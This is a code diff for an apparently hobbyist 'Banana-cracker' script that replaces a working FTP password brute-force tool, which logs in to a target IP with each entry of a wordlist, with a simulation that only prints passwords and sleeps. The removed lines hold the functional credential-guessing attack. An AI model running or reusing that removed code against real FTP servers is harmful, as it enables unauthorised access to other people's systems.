@@ -1,42 +1,33 @@
-from ftplib import FTP
+import time
 import os
 
-def ftp_login(target_ip, username, password):
-    try:
-        ftp = FTP(target_ip, timeout=5)
-        ftp.login(user=username, passwd=password)
-        print(f"[✅] SUCCESS: {username}:{password}")
-        ftp.quit()
-        return True
-    except:
-        print(f"[❌] FAILED: {username}:{password}")
-        return False
+print("Target IP:")
+target_ip = input("> ")
 
-def main():
-    print("📡 FTP Brute Force Tool")
-    target_ip = input("Target IP: ").strip()
-    username = input("FTP Username (default: anonymous): ").strip()
-    if username == "":
-        username = "anonymous"
+print("Do you want a ready-made password list (rockyou.txt)? (y/n)")
+use_rockyou = input("> ").lower()
 
-    choice = input("Do you want a ready-made password list or your own? (y/n): ").strip().lower()
+if use_rockyou == "y":
+    wordlist_path = "passlist/rockyou.txt"
+else:
+    print("Type your password list path (relative to Banana-cracker/):")
+    wordlist_path = input("> ")
 
-    if choice == 'y':
-        wordlist = "~/Banana-cracker/passlist.txt"  # ya da Termux'ta nereye koyduysan
-    else:
-        wordlist = input("Type your password list path (example: /sdcard/pass.txt): ").strip()
+# Dosya var mı kontrolü
+if not os.path.isfile(wordlist_path):
+    print("❌ File not found:", wordlist_path)
+    exit()
 
-    if not os.path.exists(wordlist):
-        print("❌ Password list file not found!")
-        return
+# Dosyayı oku
+with open(wordlist_path, "r", encoding="latin-1") as file:
+    passwords = file.readlines()
 
-    print(f"🔍 Starting brute force on {target_ip} with username: {username}")
-    with open(wordlist, 'r', errors='ignore') as f:
-        for line in f:
-            password = line.strip()
-            if ftp_login(target_ip, username, password):
-                print("🎉 Password found!")
-                break
+print(f"\n🚀 Starting brute-force on {target_ip} using {len(passwords)} passwords...\n")
 
-if __name__ == "__main__":
-    main()
+# Şifreleri sırayla dene (simülasyon)
+for password in passwords:
+    password = password.strip()
+    print(f"🔍 Trying password: {password}")
+    time.sleep(0.05)
+
+print("\n✅ Done. (Simülasyon tamamlandı)")
